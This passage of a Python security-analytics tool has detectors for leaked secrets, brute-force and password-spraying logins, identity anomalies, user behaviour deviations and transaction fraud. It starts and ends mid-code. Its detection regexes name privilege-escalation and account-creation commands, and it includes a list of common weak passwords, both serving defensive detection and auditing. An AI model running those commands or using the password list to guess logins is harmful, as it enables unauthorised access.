            s = m.group(0)
            if shannon(s) > 4.4 and not any(h["start"] <= m.start() < h["end"] for h in hits) and not s.isalpha():
                hits.append({"type": "High-entropy secret-like string", "severity": .55, "start": m.start(),
                             "end": m.end(), "sample": self._mask(s)})
        return hits[:max_hits]

    @staticmethod
    def _mask(s: str) -> str:
        s = s.strip()
        return s[:2] + "•" * max(3, min(len(s) - 4, 12)) + s[-2:] if len(s) > 6 else "•" * len(s)

    def redact(self, text: str) -> tuple[str, list]:
        hits = sorted(self.scan_text(text), key=lambda h: h["start"])
        out, pos, kept = [], 0, []
        for h in hits:
            if h["start"] < pos or h["severity"] < .5:
                continue
            out.append(text[pos:h["start"]])
            out.append(f"[REDACTED:{h['type']}]")
            pos = h["end"]
            kept.append(h)
        out.append(text[pos:])
        return "".join(out), kept

    def rules(self, row):
        t = str(row.get("text") or row.get("body") or row.get("content") or row.get("message") or row.get("line") or "")
        hits = self.scan_text(t)
        if not hits:
            return 0.0, [], {}
        by = collections.Counter(h["type"] for h in hits)
        ws = [h["severity"] for h in hits]
        score = noisy_or([max(ws)] + [w * 0.3 for w in sorted(ws)[:-1]][:5])
        why = [f"{n}× {k}" for k, n in by.most_common(6)]
        return score, why, {"matches": [{k: v for k, v in h.items() if k not in ("start", "end")} for h in hits[:20]],
                            "counts": dict(by)}

    def subject_of(self, row):
        return "text (%d chars)" % len(str(row.get("text") or row.get("body") or row.get("content") or row.get("message") or row.get("line") or ""))

    def analyze_file(self, path: str) -> dict:
        if os.path.getsize(path) > 32 << 20:
            raise ValueError("File too large for DLP text scan (32 MB limit)")
        with open(path, "rb") as f:
            raw = f.read()
        f2 = self.analyze({"text": raw.decode("utf-8", "replace")})
        f2["subject"] = os.path.basename(path)
        return f2

    def train(self, table, label=None, contamination=0.02):
        cols = set(table.columns)
        pc = next((c for c in ("pattern", "regex", "keyword", "expression") if c in cols), None)
        if pc:
            rules, bad = [], 0
            for r in table.rows:
                p = str(r.get(pc, "")).strip()
                try:
                    re.compile(p)
                    if p:
                        rules.append({"name": r.get("name") or r.get("rule") or "Custom rule", "pattern": p,
                                      "severity": min(1.0, max(0.1, fnum(r.get("severity"), .7)))})
                except re.error:
                    bad += 1
            self.custom = rules[:500]
            with open(os.path.join(self.hub.home, "dlp_custom.json"), "w", encoding="utf-8") as f:
                json.dump(self.custom, f)
            info = {"dataset": table.name, "sha256": table.sha, "rows": len(table), "ts": now(), "kind": "custom-rules"}
            self.hub.on_trained(self, info, {"rules_loaded": len(self.custom), "invalid": bad})
            return {"module": self.key, "kind": "custom-rules", "metrics": {"rules_loaded": len(self.custom), "invalid": bad}}
        return super().train(table, label, contamination)


# ═══════════════════════════════════════════════════════════════════════
#  EVENT-STREAM DETECTORS  (same code for batch datasets and live monitoring)
# ═══════════════════════════════════════════════════════════════════════
class EventDetector(Detector):
    mode = "events"
    trainable = False
    use_extra = False
    COOLDOWN = 300

    def __init__(self, hub):
        self._cool: dict = {}
        self._seq_n = 0
        self.reset()
        super().__init__(hub)

    def reset(self):
        self._cool.clear()
        self._seq_n = 0

    def load_model(self):
        self.model = None

    def _t(self, ev) -> float:
        t = ev.get("ts")
        if t is None:
            self._seq_n += 1
            t = float(self._seq_n)
            ev["ts"] = t
        return t

    def _once(self, key, ts) -> bool:
        last = self._cool.get(key)
        if last is not None and ts - last < self.COOLDOWN:
            return False
        self._cool[key] = ts
        if len(self._cool) > 20000:
            self._cool = {k: v for k, v in self._cool.items() if ts - v < self.COOLDOWN}
        return True

    def finish(self) -> list:
        return []

    def extras_summary(self, evs, findings) -> dict:
        return {}

    def analyze_table(self, table, limit=200000, threshold=50):
        evs = [norm_event(r) for r in table.rows[:limit]]
        if any(e.get("ts") for e in evs):
            evs.sort(key=lambda e: e.get("ts") or 0)
        self.reset()
        findings = []
        for ev in evs:
            findings += self.observe(ev)
        findings += self.finish()
        findings = [f for f in findings if f["score"] >= threshold]
        findings.sort(key=lambda f: -f["score"])
        sev = collections.Counter(f["severity"] for f in findings)
        ents = collections.Counter(f["entity"] for f in findings if f["entity"])
        out = {"module": self.key, "dataset": table.name, "rows": len(evs), "flagged": len(findings),
               "by_severity": dict(sev), "top_entities": ents.most_common(10), "mode": "behavioural rules + statistics",
               "findings": findings[:300]}
        out.update(self.extras_summary(evs, findings))
        self.reset()
        return out

    def analyze(self, item, **kw):
        ev = norm_event(self.row_from(item))
        fs = self.observe(ev)
        if fs:
            return max(fs, key=lambda f: f["score"])
        return make_finding(self.key, self.subject_of(self.row_from(item)), 0, ["No suspicious behaviour in this event (state-less check — "
                                                                                 "upload a dataset for sequence analysis)"], {}, self.mitre)

    def subject_of(self, row):
        e = norm_event(row)
        return f"{e.get('user', '?')} @ {e.get('src_ip', '?')}"


# ═══════════════════════════════════════════════════════════════════════
#  PASSWORD ATTACK DETECTION  (+ password audit)
# ═══════════════════════════════════════════════════════════════════════
COMMON_PW = set("""123456 password 12345678 qwerty 123456789 12345 1234 111111 1234567 dragon 123123 baseball abc123 football
monkey letmein 696969 shadow master 666666 qwertyuiop 123321 mustang 1234567890 michael 654321 superman 1qaz2wsx 7777777
121212 000000 qazwsx 123qwe killer trustno1 jordan jennifer zxcvbnm asdfgh hunter buster soccer harley batman andrew tigger
sunshine iloveyou 2000 charlie robert thomas hockey ranger daniel starwars klaster 112233 george computer michelle jessica
pepper 1111 zxcvbn 555555 11111111 131313 freedom 777777 pass maggie 159753 aaaaaa ginger princess joshua cheese amanda
summer love ashley nicole chelsea biteme matthew access yankees 987654321 dallas austin thunder taylor matrix admin welcome
login passw0rd p@ssw0rd password1 password123 admin123 root toor changeme secret test guest default letmein123 qwerty123
azerty 1q2w3e4r 1q2w3e iloveu welcome1 monkey123 football1 abcd1234 qwer1234 pass1234 lovely whatever trustno1""".split())
KEYWALKS = ("qwerty", "asdf", "zxcv", "1qaz", "2wsx", "qazwsx", "12345", "09876", "poiuy", "lkjhg")


def password_audit(pw: str, username: str = "") -> dict:
    """Local strength audit. The password is never stored or logged."""
    issues = []
    n = len(pw)
    pool = (26 if re.search(r"[a-z]", pw) else 0) + (26 if re.search(r"[A-Z]", pw) else 0) + \
           (10 if re.search(r"\d", pw) else 0) + (33 if re.search(r"[^A-Za-z0-9]", pw) else 0)
    bits = n * math.log2(pool) if pool else 0.0
    low = pw.lower()
    norm = low.translate(str.maketrans({"@": "a", "$": "s", "0": "o", "1": "i", "!": "i", "3": "e", "4": "a", "5": "s", "7": "t"}))
    base = re.sub(r"[\d\W_]+$", "", norm)
    if low in COMMON_PW or norm in COMMON_PW or base in COMMON_PW:
        issues.append("appears in common-password lists")
        bits = min(bits, 14.0)
    if any(k in low for k in KEYWALKS):
        issues.append("keyboard walk / sequence")
        bits *= 0.6
    if re.search(r"(.)\1{2,}", pw):
        issues.append("repeated characters")
        bits *= 0.8
    if re.fullmatch(r"\d+", pw):
        issues.append("digits only")
        bits = min(bits, n * 3.3)
    if re.search(r"(19|20)\d{2}$", pw):
        issues.append("ends with a year")
        bits *= 0.85
    if username and len(username) >= 3 and username.lower() in low:
        issues.append("contains the username")
        bits *= 0.5
    if n < 12:
        issues.append("shorter than 12 characters")
    guesses = 2 ** min(bits, 120)
    secs = guesses / 2 / 1e10                      # offline attack on a fast hash, 10 billion guesses/s
    score = int(clamp(bits / 80) * 100)
    label = "very weak" if score < 25 else "weak" if score < 45 else "fair" if score < 65 else "strong" if score < 85 else "excellent"

    def fmt(s):
        for lim, u in ((60, "s"), (3600, "min"), (86400, "h"), (31557600, "days"), (31557600 * 1000, "years")):
            if s < lim:
                d = {"s": 1, "min": 60, "h": 3600, "days": 86400, "years": 31557600}[u]
                return f"{s / d:.1f} {u}" if u != "s" or s >= 1 else "instantly"
        return "centuries+"
    return {"length": n, "entropy_bits": round(bits, 1), "score": score, "rating": label, "issues": issues,
            "offline_crack_estimate": fmt(secs)}


class PasswordAttackDetector(EventDetector):
    key, title = "password", "Password Attack Detection"
    blurb = ("Finds brute-force, password-spraying, credential-stuffing, distributed guessing and 'success after failures' "
             "compromise in authentication logs — live or from a dataset. Also audits password strength locally.")
    mitre = ["T1110.001", "T1110.003", "T1110.004"]
    input_help = "A JSON auth event {user, src_ip, success, ts}. (Use the dataset button for sequences.)"
    columns_help = "Authentication log: timestamp, user, src_ip, success/result. A 'password' column triggers a strength audit instead."
    W = 600

    def reset(self):
        super().reset()
        self.by_src = collections.defaultdict(collections.deque)
        self.by_user = collections.defaultdict(collections.deque)

    def observe(self, ev):
        ok = ev.get("success")
        if ok is None or not (ev.get("user") or ev.get("src_ip")):
            return []
        ts = self._t(ev)
        u, ip = ev.get("user") or "?", ev.get("src_ip") or "?"
        S, U = self.by_src[ip], self.by_user[u]
        S.append((ts, u, ok))
        U.append((ts, ip, ok))
        while S and S[0][0] < ts - self.W:
            S.popleft()
        while U and U[0][0] < ts - self.W:
            U.popleft()
        out = []
        th = int(self.hub.setting("bf_threshold", 8))
        if ip == "local":                      # wrong passphrases typed into this very app: be stricter
            th = min(th, 5)

        def emit(rule, key, score, why, mit, extra):
            if self._once((rule, key), ts):
                f = make_finding(self.key, f"{rule} from {ip}" if rule != "Distributed guessing" else f"{rule} on {u}", score, why,
                                 {"src_ip": ip, "user": u, **extra}, [mit, "T1078"] if "ompromise" in rule else [mit],
                                 verdict=rule.lower(), entity=ip if ip != "?" else u, ts=ts)
                out.append(f)
        if not ok:
            fails = [x for x in S if not x[2]]
            per_user = collections.Counter(x[1] for x in fails)
            nu = len(per_user)
            mx = max(per_user.values())
            if per_user[u] >= th:
                emit("Brute force", (ip, u), (78 if ip == "local" else 62) + min(20, (per_user[u] - th) * 3),
                     [f"{per_user[u]} failed logins for “{u}” from {ip} within {self.W // 60} min"], "T1110.001",
                     {"attempts": per_user[u]})
            if nu >= 5 and mx <= 3 and len(fails) >= 8:
                emit("Password spraying", ip, 76 + min(15, nu), [f"{ip} tried {nu} different accounts, ≤3 guesses each "
                                                                 f"({len(fails)} failures) — classic spraying"], "T1110.003",
                     {"accounts": nu, "attempts": len(fails)})
            if nu >= 15:
                emit("Credential stuffing", ip, 86 + min(10, (nu - 15) // 5), [f"{ip} failed against {nu} distinct accounts in "
                                                                               f"{self.W // 60} min (leaked-credential replay pattern)"],
                     "T1110.004", {"accounts": nu, "attempts": len(fails)})
            uf = [x for x in U if not x[2]]
            ips = {x[1] for x in uf}
            if len(ips) >= 6 and len(uf) >= 8:
                emit("Distributed guessing", u, 72 + min(15, len(ips)), [f"Account “{u}” attacked from {len(ips)} different IPs "
                                                                         f"({len(uf)} failures) — botnet-style brute force"], "T1110.001",
                     {"ips": sorted(ips)[:10]})
        else:
            prev_same = [x for x in S if not x[2] and x[1] == u]
            prev_any = [x for x in U if not x[2]]
            if len(prev_same) >= 5:
                emit("Possible account compromise", (ip, u), 92, [f"Successful login for “{u}” right after {len(prev_same)} failures "
                                                                  f"from the same IP {ip}"], "T1110.001", {"failures_before": len(prev_same)})
            elif len(prev_any) >= 8:
                emit("Possible account compromise", (u, "any"), 85, [f"“{u}” logged in successfully after {len(prev_any)} recent failures "
                                                                     f"from {len({x[1] for x in prev_any})} source(s)"], "T1110.001",
                     {"failures_before": len(prev_any)})
        return out

    def analyze(self, item, **kw):
        if isinstance(item, str) and not item.strip().startswith("{"):
            r = password_audit(item)
            risk = 100 - r["score"]
            return make_finding("password", f"password ({r['length']} chars)", risk,
                                [f"Rated {r['rating']} — about {r['entropy_bits']} bits; offline crack ≈ {r['offline_crack_estimate']}"] +
                                [i.capitalize() for i in r["issues"]], {"audit": r}, ["T1110"], verdict=r["rating"])
        return super().analyze(item, **kw)

    def analyze_table(self, table, limit=200000, threshold=50):
        if "password" in table.columns and not ({"success", "result", "outcome"} & set(table.columns)):
            rows = table.rows[:limit]
            ratings = collections.Counter()
            worst = []
            for r in rows:
                a = password_audit(str(r.get("password", "")), str(r.get("user") or r.get("username") or ""))
                ratings[a["rating"]] += 1
                worst.append((a["score"], r.get("user") or r.get("username") or "?", a))
            worst.sort(key=lambda x: x[0])
            fs = [make_finding("password", f"{u} (password hidden)", 100 - sc, [f"{a['rating']}: " + ", ".join(a["issues"][:3] or ["low entropy"])],
                               {"entropy_bits": a["entropy_bits"]}, ["T1110"]) for sc, u, a in worst[:100] if sc < 45]
            return {"module": self.key, "dataset": table.name, "rows": len(rows), "flagged": len(fs), "by_rating": dict(ratings),
                    "mode": "password strength audit (passwords are not stored)", "findings": fs}
        return super().analyze_table(table, limit, threshold)

    def extras_summary(self, evs, findings):
        kinds = collections.Counter(f["verdict"] for f in findings)
        fails = sum(1 for e in evs if e.get("success") is False)
        return {"auth_events": sum(1 for e in evs if e.get("success") is not None), "failures": fails, "by_attack_type": dict(kinds)}


# ═══════════════════════════════════════════════════════════════════════
#  IDENTITY & ACCESS MONITORING
# ═══════════════════════════════════════════════════════════════════════
PRIV_RE = re.compile(r"(?i)(add(ed)?\s+(\S+\s+)?to\s+(group\s+)?(admin|administrators|root|sudo|domain admins|wheel)|"
                     r"grant(ed)?\b.*\b(admin|owner|root|all privileges|AdministratorAccess)|role\b.*\b(assign|change|add)\w*\b.*\b(admin|owner|root)|"
                     r"net localgroup administrators|usermod\s+-a?G\s+(sudo|wheel)|sudoers|AttachUserPolicy.*Admin|make[_ ]admin|promote[d]?\s+to\s+admin)")


class IAMDetector(EventDetector):
    key, title = "iam", "Identity & Access Monitoring"
    blurb = ("Impossible travel, new-country logins, MFA fatigue, privilege escalation, dormant-account revival, service-account "
             "interactive use, concurrent sessions from many IPs.")
    mitre = ["T1078", "T1621", "T1098", "T1136"]
    input_help = "A JSON identity event {user, src_ip, country, lat, lon, success, action, ts}."
    columns_help = "Sign-in / IAM audit log: timestamp, user, src_ip, country (or lat/lon), success, action/role, mfa."

    def reset(self):
        super().reset()
        self.st: dict = {}

    def _u(self, u):
        return self.st.setdefault(u, {"last": None, "countries": set(), "ips": set(), "n": 0, "seen": None,
                                      "mfa": collections.deque(), "recent": collections.deque()})

    def observe(self, ev):
        u = ev.get("user")
        if not u:
            return []
        ts = self._t(ev)
        s = self._u(u)
        ip, ctry = ev.get("src_ip"), (ev.get("country") or "").upper()[:40]
        lat, lon = ev.get("lat"), ev.get("lon")
        act = f"{ev.get('action', '')} {ev.get('role', '')} {ev.get('msg', '')} {ev.get('resource', '')}"
        out = []

        def emit(rule, score, why, mit, extra=None, key=None):
            if self._once((rule, u, key), ts):
                out.append(make_finding(self.key, f"{rule}: {u}", score, why, {"user": u, "src_ip": ip, **(extra or {})},
                                        [mit], verdict=rule.lower(), entity=u, ts=ts))
        okish = ev.get("success") is not False
        hour = hour_dow(ts)[0] if ts > 1e8 else 12
        if okish and s["last"]:
            lt, lip, lc, la, lo = s["last"]
            dt = max(ts - lt, 1.0)
            if lat is not None and lon is not None and la is not None and lo is not None:
                km = haversine_km(la, lo, lat, lon)
                spd = km / (dt / 3600)
                if km > 300 and spd > 900:
                    emit("Impossible travel", 88 if spd > 1500 else 78,
                         [f"{km:,.0f} km between logins {dt / 60:.0f} min apart (≈{spd:,.0f} km/h) — physically impossible"], "T1078",
                         {"km": round(km), "kmh": round(spd)})
            elif ctry and lc and ctry != lc and dt < 7200:
                emit("Impossible travel", 80, [f"Logins from {lc} and {ctry} only {dt / 60:.0f} min apart"], "T1078",
                     {"from": lc, "to": ctry})
        if okish and ctry and s["n"] >= 10 and s["countries"] and ctry not in s["countries"]:
            emit("New country", 48, [f"First login for “{u}” from {ctry} after {s['n']} logins elsewhere ({', '.join(sorted(s['countries'])[:3])})"],
                 "T1078", {"country": ctry}, key=ctry)
        if PRIV_RE.search(act):
            off = hour < 6 or hour >= 22
            emit("Privilege escalation", 84 if off else 68, [f"Privileged change: {act.strip()[:90]}" + (" (outside business hours)" if off else "")],
                 "T1098", {"action": act.strip()[:120]})
        if re.search(r"(?i)(create[d]?\s+user|new\s+account|useradd|net user .* /add|CreateUser)", act):
            emit("Account created", 42, [f"New account created: {act.strip()[:80]}"], "T1136", {})
        mf = f"{ev.get('mfa', '')} {act}".lower()
        if re.search(r"mfa|push|2fa|otp|duo|authenticator", mf):
            if re.search(r"den|fail|reject|timeout|no_response|declin", mf):
                s["mfa"].append(ts)
            while s["mfa"] and s["mfa"][0] < ts - 600:
                s["mfa"].popleft()
            if len(s["mfa"]) >= 5 and ev.get("success") is True:
                emit("MFA fatigue", 90, [f"{len(s['mfa'])} denied/ignored MFA prompts, then approval — push-bombing pattern"], "T1621")
            elif len(s["mfa"]) >= 5:
                emit("MFA fatigue", 62, [f"{len(s['mfa'])} MFA prompts denied/ignored in 10 minutes"], "T1621", key="deny")
        if okish and s["seen"] and ts - s["seen"] > 90 * 86400 and s["n"] >= 3:
            emit("Dormant account revived", 62, [f"“{u}” was inactive for {(ts - s['seen']) / 86400:.0f} days, then logged in"], "T1078")
        if re.match(r"(?i)^(svc[_-]|service[_-]|sa[_-]|.+\$$)", u) and re.search(r"(?i)interactive|rdp|remote|ssh|console|login", act) and okish:
            emit("Service account interactive use", 66, [f"Service account “{u}” used interactively"], "T1078.003")
        if okish and ip:
            s["recent"].append((ts, ip))
            while s["recent"] and s["recent"][0][0] < ts - 900:
                s["recent"].popleft()
            ips = {x[1] for x in s["recent"]}
            nets = {".".join(i.split(".")[:3]) if "." in i else i for i in ips}
            if len(ips) >= 3 and len(nets) >= 3:
                emit("Concurrent sessions", 56, [f"“{u}” active from {len(ips)} IPs in {len(nets)} different networks within 15 minutes"], "T1078",
                     {"ips": sorted(ips)})
        if okish:
            s["last"] = (ts, ip, ctry, lat, lon)
            if ctry:
                s["countries"].add(ctry)
            if ip:
                s["ips"].add(ip)
            s["n"] += 1
            s["seen"] = ts
        return out


# ═══════════════════════════════════════════════════════════════════════
#  USER & ENTITY BEHAVIOUR ANALYTICS
# ═══════════════════════════════════════════════════════════════════════
SENSITIVE_RES = re.compile(r"(?i)(finance|payroll|salary|hr|admin|secret|backup|password|vault|customer|confidential|database|prod|ssn|credential)")


class UBADetector(EventDetector):
    key, title = "uba", "User Behavior Analytics"
    blurb = ("Learns a baseline per user (hours, actions, resources, devices, locations, data volume) and scores deviations. "
             "Profiles keep learning from live events; a behavioural Isolation Forest adds a statistical second opinion.")
    mitre = ["T1078", "T1530", "T1074"]
    input_help = "A JSON user event {user, ts, action, resource, bytes, device, country}."
    columns_help = "Activity log: timestamp, user, action, resource, bytes, device/ip/country. Needs a few hundred events per user to learn."
    WARM = 20

    def reset(self):
        super().reset()
        self.prof: dict = {}
        self._feat: list = []
        self.iso: IsoForest | None = getattr(self, "iso", None)

    def _p(self, u):
        return self.prof.setdefault(u, {"n": 0, "hours": np.zeros(24), "act": collections.Counter(), "res": set(), "dev": set(),
                                        "ip": set(), "ctry": set(), "bn": 0, "bm": 0.0, "bm2": 0.0})

    def observe(self, ev):
        u = ev.get("user")
        if not u:
            return []
        ts = self._t(ev)
        p = self._p(u)
        h = hour_dow(ts)[0] if ts > 1e8 else 12
        act = str(ev.get("action") or "")[:60]
        res = str(ev.get("resource") or "")[:120]
        dev, ip, ctry = ev.get("device") or ev.get("host"), ev.get("src_ip"), (ev.get("country") or "").upper()
        b = ev.get("bytes") if ev.get("bytes") is not None else ev.get("bytes_out")
        ws, why = [], []
        n = p["n"]
        if n >= self.WARM:
            pr = (p["hours"][h] + 0.5) / (n + 12)
            if pr < 0.01:
                ws.append(min(.6, .35 + (0.01 - pr) * 20))
                why.append(f"Activity at {h:02d}:00 is unusual for “{u}” (only {pr * 100:.1f}% of their history)")
            if res and len(p["res"]) >= 5 and res not in p["res"]:
                sens = bool(SENSITIVE_RES.search(res))
                ws.append(.6 if sens else .3)
                why.append(f"First access to {'sensitive ' if sens else ''}resource “{res[:50]}”")
            if act and n >= 100 and p["act"][act] / n < 0.01:
                ws.append(.3)
                why.append(f"Rare action “{act}” for this user")
            if dev and p["dev"] and dev not in p["dev"]:
                ws.append(.3)
                why.append(f"New device “{str(dev)[:30]}”")
            if ctry and p["ctry"] and ctry not in p["ctry"]:
                ws.append(.5)
                why.append(f"New country {ctry}")
            elif ip and p["ip"] and ip not in p["ip"] and len(p["ip"]) < 6 and not ctry:
                ws.append(.15)
                why.append("New source IP")
            if b is not None and p["bn"] >= 20:
                sd = math.sqrt(p["bm2"] / max(p["bn"] - 1, 1)) or 1.0
                z = (b - p["bm"]) / sd
                if z > 4 and b > p["bm"] * 5:
                    ws.append(min(.85, .3 + .1 * z))
                    why.append(f"Data volume {human(b)} is {z:.0f}σ above their norm (avg {human(p['bm'])}) — possible exfiltration")
        feats = [math.sin(2 * math.pi * h / 24), math.cos(2 * math.pi * h / 24), math.log1p(max(b or 0, 0)) / 10,
                 float(bool(res) and res not in p["res"] and n >= self.WARM), float(bool(dev) and dev not in p["dev"] and n >= self.WARM),
                 float(bool(ctry) and ctry not in p["ctry"] and n >= self.WARM), math.log1p(n) / 6]
        out = []
        sc = noisy_or(ws) * 100 if ws else 0.0
        if self.iso is not None and n >= self.WARM:
            ms = float(self.iso.score(np.array([feats]))[0])
            if ms > 0.68:
                ws.append(.5 * (ms - .6) / .4 + .25)
                why.append(f"Behavioural outlier (Isolation Forest {ms:.2f})")
                sc = noisy_or(ws) * 100
        if sc >= 50 and self._once((u, round(sc // 10)), ts):
            out.append(make_finding(self.key, f"Behaviour deviation: {u}", sc, why, {"user": u, "action": act, "resource": res},
                                    self.mitre, entity=u, ts=ts))
        self._feat.append(feats)
        p["n"] += 1
        p["hours"][h] += 1
        if act:
            p["act"][act] += 1
        if res and len(p["res"]) < 5000:
            p["res"].add(res)
        for k, v in (("dev", dev), ("ip", ip), ("ctry", ctry)):
            if v and len(p[k]) < 500:
                p[k].add(v)
        if b is not None:
            p["bn"] += 1
            d = b - p["bm"]
            p["bm"] += d / p["bn"]
            p["bm2"] += d * (b - p["bm"])
        return out

    def finish(self):
        if len(self._feat) >= 300 and self.iso is None:        # learn a behavioural model from this dataset
            X = np.array(self._feat[-20000:])
            self.iso = IsoForest(seed=3).fit(X)
        return []

    def extras_summary(self, evs, findings):
        return {"users_profiled": len(self.prof), "events_per_user_median": int(np.median([p["n"] for p in self.prof.values()])) if self.prof else 0}


# ═══════════════════════════════════════════════════════════════════════
#  FRAUD DETECTION
# ═══════════════════════════════════════════════════════════════════════
class FraudDetector(EventDetector):
    key, title = "fraud", "Fraud Detection"
    blurb = ("Transaction scoring with per-account history: amount vs. norm, velocity, new merchant/country/device, structuring, "
             "odd hours. Learns from a labelled history (is_fraud) or flags outliers without labels.")
    mitre = []
    mode = "table"
    trainable = True
    input_help = "A JSON transaction {user, amount, merchant, country, device, ts}."
    columns_help = "Transactions: timestamp, account/user, amount, merchant, country, device + optional label (is_fraud). PaySim / Kaggle credit-card style files work."

    def load_model(self):
        d = self._model_blob()
        self.model = None
        if d:
            try:
                self.model = LearnedModel.from_dict(d["model"])
                self.trained_on = d.get("trained_on")
            except Exception:
                self.model = None

    def reset(self):
        super().reset()
        self.st: dict = {}

    def _feats(self, ev) -> dict:
        u = ev.get("user") or ev.get("raw", {}).get("nameorig") or "?"
        ts = self._t(ev)
        amt = ev.get("amount") or 0.0
        s = self.st.setdefault(u, {"n": 0, "mean": 0.0, "m2": 0.0, "max": 0.0, "last": None, "m": set(), "c": set(), "d": set(),
                                   "t": collections.deque(), "near": collections.deque()})
        mer, ctry, dev = ev.get("merchant"), (ev.get("country") or ""), ev.get("device")
        while s["t"] and s["t"][0] < ts - 3600:
            s["t"].popleft()
        s["t"].append(ts)
        while s["near"] and s["near"][0] < ts - 86400:
            s["near"].popleft()
        if 9000 <= amt < 10000:
            s["near"].append(ts)
        sd = math.sqrt(s["m2"] / max(s["n"] - 1, 1)) if s["n"] > 2 else 0
        z = (amt - s["mean"]) / sd if sd > 0 else 0.0
        h = hour_dow(ts)[0] if ts > 1e8 else 12
        f = {"fx_log_amount": math.log1p(max(amt, 0)), "fx_amount_z": clamp(z, -8, 8),
             "fx_amount_vs_max": min(5.0, amt / (s["max"] + 1)) if s["n"] else 0.0, "fx_velocity_1h": float(len(s["t"])),
             "fx_log_gap": math.log1p(min(ts - s["last"], 7 * 86400)) if s["last"] is not None else 12.0,
             "fx_new_merchant": float(bool(mer) and s["n"] >= 3 and mer not in s["m"]),
             "fx_new_country": float(bool(ctry) and s["n"] >= 3 and ctry not in s["c"]),
             "fx_new_device": float(bool(dev) and s["n"] >= 3 and dev not in s["d"]),
             "fx_hour_sin": math.sin(2 * math.pi * h / 24), "fx_hour_cos": math.cos(2 * math.pi * h / 24),
             "fx_night": float(h < 6), "fx_round": float(amt >= 100 and amt % 100 == 0), "fx_history": math.log1p(s["n"]),
             "fx_structuring": float(len(s["near"]))}
        s["n"] += 1
        d = amt - s["mean"]
        s["mean"] += d / s["n"]
        s["m2"] += d * (amt - s["mean"])
        s["max"] = max(s["max"], amt)
        s["last"] = ts
        for k, v in (("m", mer), ("c", ctry), ("d", dev)):
            if v and len(s[k]) < 2000:
                s[k].add(v)
        return f

    def _rule_score(self, f, amt):
        ws, why = [], []
        if f["fx_velocity_1h"] >= 6:
            ws.append(min(.8, .4 + .05 * f["fx_velocity_1h"]))
            why.append(f"{int(f['fx_velocity_1h'])} transactions within an hour (velocity)")
        if f["fx_amount_z"] > 5:
            ws.append(min(.85, .45 + .05 * f["fx_amount_z"]))
            why.append(f"Amount {amt:,.2f} is {f['fx_amount_z']:.1f}σ above this account's norm")
        if f["fx_new_country"] and f["fx_new_device"]:
            ws.append(.55 + (.15 if amt and f["fx_amount_z"] > 2 else 0))
            why.append("New country AND new device")
        elif f["fx_new_merchant"] and f["fx_night"] and f["fx_amount_z"] > 2:
            ws.append(.5)
            why.append("Large payment to a new merchant at night")
        if f["fx_structuring"] >= 3:
            ws.append(.7)
            why.append("Several amounts just under 10,000 in 24 h (structuring)")
        if f["fx_round"] and f["fx_amount_z"] > 3:
            ws.append(.35)
            why.append("Large round-number amount")
        return noisy_or(ws), why

    def _enrich(self, evs):
        self.reset()
        out = []
        for ev in evs:
            f = self._feats(ev)
            row = dict(ev["raw"])
            row.update(f)
            out.append((ev, row, f))
        return out

    def train(self, table, label=None, contamination=0.01):
        evs = [norm_event(r) for r in table.rows[:MAX_ROWS]]
        if any(e.get("ts") for e in evs):
            evs.sort(key=lambda e: e.get("ts") or 0)
        rows = [r for _, r, _ in self._enrich(evs)]
        self.reset()
        lc = None if (label or "").lower() == "none" else detect_label(rows, label)
        m = LearnedModel()
        metrics = m.fit_supervised(rows, lc) if lc else m.fit_anomaly(rows, contamination)
        self.model = m
        self.trained_on = {"dataset": table.name, "sha256": table.sha, "rows": len(table), "ts": now(), "label": lc, "kind": m.kind}
        self.trained_on["model_sha256"] = self.save_model()
        self.hub.on_trained(self, self.trained_on, metrics)
        return {"module": self.key, "kind": m.kind, "label_column": lc, "metrics": metrics, "classes": m.classes,
                "model_sha256": self.trained_on["model_sha256"]}

    def _score(self, ev, row, f):
        rs, why = self._rule_score(f, ev.get("amount") or 0.0)
        ml = self.model.score_row(row) if self.model else None
        sc = self.combine(rs, ml)
        if ml:
            why = why + [f"Learned model: {ml['label']} ({ml['score'] * 100:.0f}%)"]
        return sc * 100, why, ml

    def observe(self, ev):
        if ev.get("amount") is None:
            return []
        f = self._feats(ev)
        row = dict(ev["raw"])
        row.update(f)
        sc, why, ml = self._score(ev, row, f)
        if sc >= 50:
            return [make_finding(self.key, f"{ev.get('user', '?')} · {ev.get('amount'):,.2f}", sc, why or ["Model flagged"],
                                 {"user": ev.get("user"), "amount": ev.get("amount"), "merchant": ev.get("merchant"),
                                  "country": ev.get("country")}, ["T1657"], entity=ev.get("user") or "", ts=ev.get("ts"))]
        return []

    def analyze_table(self, table, limit=200000, threshold=50):
        evs = [norm_event(r) for r in table.rows[:limit]]
        evs = [e for e in evs if e.get("amount") is not None]
        if any(e.get("ts") for e in evs):
            evs.sort(key=lambda e: e.get("ts") or 0)
        trip = self._enrich(evs)
        ml = self.model.score_rows([r for _, r, _ in trip]) if self.model else [None] * len(trip)
        findings, scores = [], []
        for (ev, row, f), m in zip(trip, ml):
            rs, why = self._rule_score(f, ev.get("amount") or 0.0)
            sc = self.combine(rs, m) * 100
            scores.append(sc)
            if sc >= threshold:
                if m:
                    why = why + [f"Learned model: {m['label']} ({m['score'] * 100:.0f}%)"]
                findings.append(make_finding(self.key, f"{ev.get('user', '?')} · {ev.get('amount', 0):,.2f}", sc, why or ["Model flagged"],
                                             {"user": ev.get("user"), "amount": ev.get("amount")}, ["T1657"], entity=ev.get("user") or ""))
        self.reset()
        findings.sort(key=lambda f: -f["score"])
        tot = sum((e.get("amount") or 0) for e, _, _ in trip)
        flagged_amt = sum(f["evidence"].get("amount") or 0 for f in findings)
        out = self.table_summary(table, [r for _, r, _ in trip], scores, findings)
        out.update(total_amount=round(tot, 2), flagged_amount=round(flagged_amt, 2))
        return out


# ═══════════════════════════════════════════════════════════════════════
#  NETWORK TRAFFIC ANALYSIS
# ═══════════════════════════════════════════════════════════════════════
LATERAL_PORTS = {445, 3389, 22, 5985, 5986, 135, 139, 23, 5900}
PERIODIC_OK = {123, 5353, 137, 138, 1900, 67, 68}


def read_pcap(data: bytes, limit=300000) -> list:
    """Minimal classic-pcap (Ethernet/IPv4 TCP/UDP) reader → flow-like events (no external libs)."""
    if len(data) < 24:
        raise ValueError("not a pcap file")
    magic = data[:4]
    if magic in (b"\xd4\xc3\xb2\xa1", b"\x4d\x3c\xb2\xa1"):
        en, nano = "<", magic == b"\x4d\x3c\xb2\xa1"
    elif magic in (b"\xa1\xb2\xc3\xd4", b"\xa1\xb2\x3c\x4d"):
        en, nano = ">", magic == b"\xa1\xb2\x3c\x4d"
    else:
        raise ValueError("Only classic .pcap is supported (convert pcapng with: editcap -F pcap in.pcapng out.pcap)")
